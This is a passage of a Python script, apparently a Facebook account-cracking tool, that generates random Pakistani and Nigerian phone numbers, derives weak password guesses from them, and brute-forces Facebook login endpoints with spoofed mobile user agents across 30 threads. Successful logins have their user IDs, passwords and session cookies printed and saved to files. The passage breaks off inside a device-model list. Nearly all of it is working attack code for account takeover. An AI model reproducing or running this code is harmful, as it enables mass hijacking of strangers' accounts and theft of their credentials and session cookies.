    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l3} MATHOD {f}- {b}3\n {l4} MATHOD {f}- {b}4 {sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    elif mthd_inn in ['c','C','3','03']:sxr_mthd.append("C")
    elif mthd_inn in ['d','D','4','04']:sxr_mthd.append("D")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],hugu[2:8],hugu[1:8],ids,hugu]
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in sxr_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
            elif 'D' in sxr_mthd:sifaxxx.submit(rndm4,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SMILE-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ SMILE RANDOM PAKISTAN ]▬▭▬▭▬▭▬▭#
def pak():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}0300 {a}- {f}0340 {a}- {f}0320 {a}- {f}0330\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(7))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l3} MATHOD {f}- {b}3\n {l4} MATHOD {f}- {b}4 {sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    elif mthd_inn in ['c','C','3','03']:sxr_mthd.append("C")
    elif mthd_inn in ['d','D','4','04']:sxr_mthd.append("D")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6]]
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in sxr_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
            elif 'D' in sxr_mthd:sifaxxx.submit(rndm4,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SMILE-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ SMILE RANDOM NIG ]▬▭▬▭▬▭▬▭#
def nig():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}708 {a}- {f}080 {a}- {f}090 {a}- {f}081{f}\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(7))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l3} MATHOD {f}- {b}3\n {l4} MATHOD {f}- {b}4 {sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    elif mthd_inn in ['c','C','3','03']:sxr_mthd.append("C")
    elif mthd_inn in ['d','D','4','04']:sxr_mthd.append("D")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],hugu[2:8],hugu[1:8],ids,hugu,]
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in sxr_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
            elif 'D' in sxr_mthd:sifaxxx.submit(rndm4,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SMILE-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 1 ]▬▭▬▭▬▭▬▭#
def rndm1(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r\r {a}[{b}SMILE-M1{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
            sm1 =('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
            sm2 =("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
            oppo1 =("CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979")
            oppo2 =('LMK420Y','LM-V600VML','LM-K315','LM-Q725S','LM-K315','LMK525','LMQ730HA','LM-Q925S','LMX440IM','LMQ730TM','LM-G910EMW','LM-X440ZM','LM-K315IM','LM-Q520N','LM-Q610','LM-Q630N','LMK610IM','LMX440ZM','LMK520','Q710','LMV600VML','LM-X440ZM','LM-K610IM','LMK420H','LMK520, LM-K520','LM-Q610(FGN)','LMG910EMW','LM-K525')
            vivo1 =('vivo 1906','vivo 1938','vivo 1601','vivo 1920','vivo 1801','vivo 1935','vivo 1724','vivo 1901','XQ-BT44','XQ-AT52','XQ-BC52','MI CC9 Pro Premium Edition','Redmi Note 8 Pro','Mi Note 10','MI 8 Explorer Edition','Mi Note 10 Lite')
            max = random.choice([sm1,sm2,oppo1,oppo2,vivo1])
            ua3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            git_fb = session.get(f"https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr").text
            logn_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(git_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pww,'jazoest': re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            user_info = {'Host': f'{fb}.facebook.com',
            'Connection': 'keep-alive',
            'Content-Length': '{len(str(logn_data))}',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-model': '"GT-414XOP"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': ua3,
            'viewport-width': '400',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),
            'sec-ch-ua-platform-version': '"9.0.0"',
            'X-ASBD-ID': '129477',
            'dpr': '1.8',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'Accept': '*/*',
            'Origin': f'https://{fb}.facebook.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': f'https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
            url = f"https://www.facebook.com/login/device-based/login/async/?api_key=212500508799908&auth_token=aedffdb1606919704ead2d4fa891ac15&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&refsrc=deprecated&app_id=212500508799908&cancel=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&lwv=100"
            sxr_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
            login_coki=session.cookies.get_dict().keys()
            if 'c_user' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=re.findall("c_user=(.*);xs", coki)[0]
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[SUCCESS-💚] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    open('/sdcard/SMILE-RNDM-OK-COOKIE.txt.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/SMILE-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')                   
                    oks.append(uid)
                    Elite(uid,pww,coki)
                    break
                else:break
            elif 'checkpoint' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split('checkpoint=')[1]
                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
                #print(f"\r\r {c}[SMILE-CP] {uid} | {pww}")
                open('/sdcard/SMILE-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 2 ]▬▭▬▭▬▭▬▭#
def rndm2(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r\r {a}[{b}SMILE-M2{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
            sm1 =('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 